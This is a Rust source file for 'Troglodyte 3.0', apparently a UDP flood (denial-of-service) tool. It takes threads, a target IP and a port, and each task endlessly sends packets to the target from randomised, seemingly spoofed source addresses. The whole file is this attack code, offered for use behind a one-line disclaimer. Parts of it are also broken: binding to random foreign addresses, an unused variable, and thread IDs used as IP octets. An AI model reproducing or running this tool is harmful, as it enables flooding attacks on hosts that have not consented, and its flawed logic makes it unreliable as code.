use rand::{thread_rng, Rng};
use std::net::SocketAddrV4;
use std::sync::Arc;
use std::sync::Mutex;
use std::io;
use std::env;
use futures::future::try_join_all;
use tokio::time::Duration;
use tokio::time::sleep;
use tokio::net::UdpSocket;
use tokio::task::JoinHandle;

fn input(prompt: &str) -> String {
    println!("{}", prompt);
    let mut input: String = String::new();
    io::stdin()
        .read_line(&mut input)
        .expect("Failed to read line");
    input.trim().to_string()
}


#[tokio::main]
async fn main() {
    println!("Troglodyte 3.0 By VTJ0cGJ\nThe creator does not endorse any unintended use of this software");

    let args: Vec<String> = env::args().collect();

    if args.len() != 7 {
        eprintln!("Usage: {} -t <threads> -ip <target_ip> -p <target_port>", args[0]);
        std::process::exit(1);
    }

    let mut threads: Option<u32> = None;
    let mut target_ip: Option<String> = None;
    let mut target_port: Option<u16> = None;
    let mut ip_rangeq: Option<bool> = None;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-t" => {
                i += 1;
                threads = Some(match args[i].parse() {
                    Ok(value) => value,
                    Err(e) => {
                        eprintln!("Error parsing threads: {}", e);
                        std::process::exit(1);
                    }
                });
            }
            "-ip" => {
                i += 1;
                target_ip = Some(match args[i].parse() {
                    Ok(value) => value,
                    Err(e) => {
                        eprintln!("Error parsing target IP: {}", e);
                        std::process::exit(1);
                    }
                });
            }
            "-p" => {
                i += 1;
                target_port = Some(match args[i].parse() {
                    Ok(value) => value,
                    Err(e) => {
                        eprintln!("Error parsing target port: {}", e);
                        std::process::exit(1);
                    }
                });
            }
            _ => {
                eprintln!("Unknown option: {}", args[i]);
                std::process::exit(1);
            }
        }

        i += 1;
    }

    let threads = threads.expect("Missing threads parameter");
    let target_ip = target_ip.expect("Missing target IP parameter");
    let target_port = target_port.expect("Missing target port parameter");


    println!("Threads: {}", threads);
    println!("Target IP: {}", target_ip);
    println!("Target Port: {}", target_port);

    let threads_list: Arc<Mutex<Vec<JoinHandle<()>>>> = Arc::new(Mutex::new(Vec::new()));

    for thread_id in 1..=threads {
        let source_ip: String = format!(
            "{}.{}.{}.{}",
            thread_rng().gen_range(0..=255),
            thread_rng().gen_range(0..=255),
            thread_rng().gen_range(0..=255),
            thread_id 
        //  ^^^^^^^^^
            // NOTE: optimise this later to eradicate the possibility of ip doubleups
        );

        let handle: JoinHandle<()> = tokio::spawn(attack(
            source_ip.clone(),
            target_ip.clone(),
            target_port,
            thread_id,
        ));

        threads_list.lock().expect("REASON").push(handle);
    }

    let _ = try_join_all(threads_list.lock().expect("REASON").drain(..).collect::<Vec<_>>()).await;
}

async fn attack(source_ip: String, target_ip: String, target_port: u16, thread_id: u32) {
    let mut i: i32 = 1;
    loop {
        let source_port: i32 = rand::thread_rng().gen_range(1..=65535);

        // Create the destination address
        let addr: String = format!("{}:{}", target_ip, target_port);

        // Bind the socket to the source IP and port
        let local_addr: String = format!("{}:{}", source_ip, source_port);
        println!("Local Address: {}", local_addr);
        let socket: UdpSocket = UdpSocket::bind(&local_addr).await.expect("Failed to bind address");

        // Send data to the target address
        let data_to_send: &[u8] = b"Hello, server!";

        socket.send_to(data_to_send, &addr.parse::<SocketAddrV4>().expect("Invalid target address"))
            .await
            .expect("Failed to send data");    

        println!("Packet sent: {} on thread: {}", i, thread_id);

        // Sleep for 100 milliseconds before sending the next packet
        sleep(Duration::from_millis(100)).await;
        i += 1;
    }
}